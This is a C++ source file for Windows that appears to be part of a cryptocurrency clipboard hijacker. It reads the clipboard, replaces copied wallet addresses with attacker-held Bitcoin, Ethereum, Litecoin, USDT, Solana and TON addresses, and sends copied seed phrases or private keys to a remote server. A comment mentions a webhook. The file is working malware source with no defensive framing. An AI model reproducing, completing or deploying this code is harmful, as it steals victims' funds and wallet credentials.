#include <Windows.h>
#include <iostream>
#include "settings.h"
#include "server.h"

auto __read_clip() -> std::string
{
	if (OpenClipboard(nullptr))
	{
		HANDLE hData = GetClipboardData(CF_OEMTEXT);
		if (!hData) {
			CloseClipboard();
			return "";
		}
		char* pszText = static_cast<char*>(GlobalLock(hData));
		if (!pszText) {
			GlobalUnlock(hData);
			CloseClipboard();
			return "";
		}
		std::string __text_clipped(pszText);
		GlobalUnlock(hData);
		CloseClipboard();
		return __text_clipped;
	}
	return std::string();
}

auto __write_clip(std::string sBtcAdd1y) -> bool
{
	if (sBtcAdd1y.empty()) return false;
	if (OpenClipboard(nullptr))
	{
		const char* output = sBtcAdd1y.c_str();
		const size_t len = strlen(output) + 1;
		HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
		if (!hMem) return false;
		memcpy(GlobalLock(hMem), output, len);
		GlobalUnlock(hMem);
		OpenClipboard(0);
		EmptyClipboard();
		SetClipboardData(CF_TEXT, hMem);
		CloseClipboard();
		return true;
	}
	return false;
}

auto __replace(int iCrypdtoFormat) -> bool
{
	if (iCrypdtoFormat == 1) { __write_clip(sBtcAddy); }
	if (iCrypdtoFormat == 2) { __write_clip(sEthAddy); }
	if (iCrypdtoFormat == 3) { __write_clip(sLtcAddy); }
	if (iCrypdtoFormat == 4) { __write_clip(sUsdtAddy); }
	if (iCrypdtoFormat == 6) { __write_clip(sSolAddy); }
	if (iCrypdtoFormat == 7) { __write_clip(sTonAddy); }
	return true;
}

auto __send_seed_key(std::string sSeedOrKey, int iCrypdtoFormat) -> bool
{
	if (iCrypdtoFormat == 5) { __server_send(sSeedOrKey); }
	__write_clip(sSeedOrKey + " "); // doing this so it dont spam it 100x to webhook in loop (9939349849 IQ move no cap)
	return true;
}
